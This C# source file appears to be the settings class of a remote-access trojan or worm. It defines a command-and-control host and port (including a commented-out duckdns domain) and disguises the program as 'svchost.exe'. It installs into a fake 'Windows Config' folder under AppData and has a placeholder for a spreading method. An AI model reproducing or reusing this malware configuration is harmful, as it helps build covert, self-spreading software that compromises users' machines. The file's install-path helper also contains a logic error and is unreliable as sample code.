using System;
using System.IO;
namespace boulzar
{
    public static class Csettings
    {
        public static string Tag = "Tag";

        public static string DNS = "192.168.1.6";//"googlez.duckdns.org";
        public static string Port = "1604";
        public static string ApplicationName = "svchost.exe";
        public static string VersionNumber = "1.0.0.0";
        public static string install_path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\Windows Config";
        public static string FolderName;
        public static string sprd_method = "SPREED METHOD NAME";

        public static string GetinstalleP()
        {

            string path = "";
            if (Csettings.install_path == "%appdata%")
                path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
            else
                path = Path.GetTempPath();

            return path;
        }
    }
}
